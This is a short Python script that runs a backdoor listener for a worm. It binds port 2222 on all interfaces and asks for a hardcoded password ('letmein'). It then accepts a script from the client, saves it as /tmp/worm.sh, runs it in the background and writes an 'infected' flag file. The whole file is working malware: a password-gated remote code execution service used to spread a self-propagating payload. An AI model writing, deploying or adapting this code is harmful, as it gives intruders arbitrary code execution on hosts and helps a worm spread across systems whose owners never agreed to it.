import socket, threading, os

def handler(conn):
    try:
        conn.send(b"Password: \n")
        print("Prompt sent, waiting for password...", flush=True)
        pw = conn.recv(1024)
        print(f"Received raw pw: {pw!r}", flush=True)
        if not pw:
            print("No password received, closing.", flush=True)
            conn.close()
            return
        pw = pw.strip()
        print(f"Processed password: {pw!r}", flush=True)
        if pw == b'letmein':
            if os.path.exists("/tmp/infected.flag"):
                print("Already infected, informing client.", flush=True)
                conn.send(b"Already infected\n")
            else:
                print("Correct password, requesting script.", flush=True)
                conn.send(b"Send your script:\n")
                script = conn.recv(10000)
                print(f"Received script of length: {len(script)}", flush=True)
                with open("/tmp/worm.sh", "wb") as f:
                    f.write(script)
                print("Saved script to /tmp/worm.sh. Attempting to execute.", flush=True)
                os.system("chmod +x /tmp/worm.sh && /tmp/worm.sh &")
                with open("/tmp/infected.flag", "w") as f:
                    f.write("infected")
                print("Infection complete, responding to client.", flush=True)
                conn.send(b"Payload executed\n")
        else:
            print("Wrong password, access denied.", flush=True)
            conn.send(b"Access denied\n")
    except Exception as e:
        print(f"Exception: {e}", flush=True)
    finally:
        conn.close()

s = socket.socket()
s.bind(("0.0.0.0", 2222))
s.listen(5)
print("Listening on port 2222...", flush=True)
while True:
    c, _ = s.accept()
    threading.Thread(target=handler, args=(c,)).start()
